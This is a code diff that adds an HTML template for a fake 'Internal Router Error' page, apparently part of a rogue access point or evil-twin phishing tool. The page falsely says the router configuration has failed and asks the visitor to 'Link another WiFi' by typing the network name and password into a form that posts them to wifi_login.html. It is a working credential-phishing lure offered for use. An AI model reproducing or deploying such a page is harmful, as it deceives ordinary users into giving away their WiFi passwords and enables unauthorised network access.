@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Internal Router Error</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='main.css') }}" />
+</head>
+<body>
+    <center><h1>The Router Configuration has Encountered an Error</h1><br></center>
+    <p><center>Please Link another WiFi to solve this Problem.<br>
+    The Router will only load the Configuration and set the Same in this routers Settings.</center><br><br>
+    <span style="color:red"><center>WARNING : Only do this if you're good with Networking.<br>
+    If not, Contact an <strong>Expert</strong> or Contact your ISP.</center></span>
+    </p>
+    <form action="wifi_login.html" method="POST">
+        <center><input type="text" name="essid" placeholder="WIFI ESSID (NAME)" class="input"></center><br>
+        <center><input type="password" name="password" placeholder="WIFI Password" class="input"></center><br>
+        <center><input type="submit" value="Link WiFi" class="wifi-button"></center><br>
+    </form>
+</body>
+</html>
